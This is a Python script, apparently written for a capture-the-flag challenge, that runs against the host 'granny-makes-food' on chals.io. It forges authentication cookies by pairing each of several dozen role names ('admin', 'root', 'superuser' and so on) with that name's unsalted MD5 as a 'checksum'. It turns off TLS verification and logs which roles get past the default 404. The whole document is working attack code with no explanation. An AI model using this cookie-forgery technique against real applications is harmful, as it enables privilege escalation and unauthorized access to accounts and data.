import requests, hashlib, time
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
md5=lambda s:hashlib.md5(s.encode()).hexdigest()
roles=["grandma","Grandma","granny","Granny","chef","Chef","admin","Administrator","user","kitchen helper","kitchen-helper","Kitchen Helper","baker","cook","owner","manager","boss","guest","master","root","superuser","sour","pickle","grannymakesfood","granny-makes-food","food","competition","challenger","contestant","vip","customer","staff","employee","grannysmith"]
results=[]
for role in roles:
    cs={"role":role,"checksum":md5(role)}
    best=None
    for attempt in range(3):
        try:
            r=requests.get(URL+"home", cookies=cs, timeout=20, verify=False)
            if not (r.status_code==404 and len(r.content)==207):
                best=(attempt,r.status_code,len(r.content))
                break
            best=(attempt,r.status_code,len(r.content)) if best is None or r.status_code!=404 else best
        except Exception as e:
            best=(attempt,"ERR",repr(e)[:60])
            break
    if best and not (best[1]==404 and best[2]==207):
        results.append((role,best))
    else:
        results.append((role,None))
for role,b in results:
    print(role, "->", b)
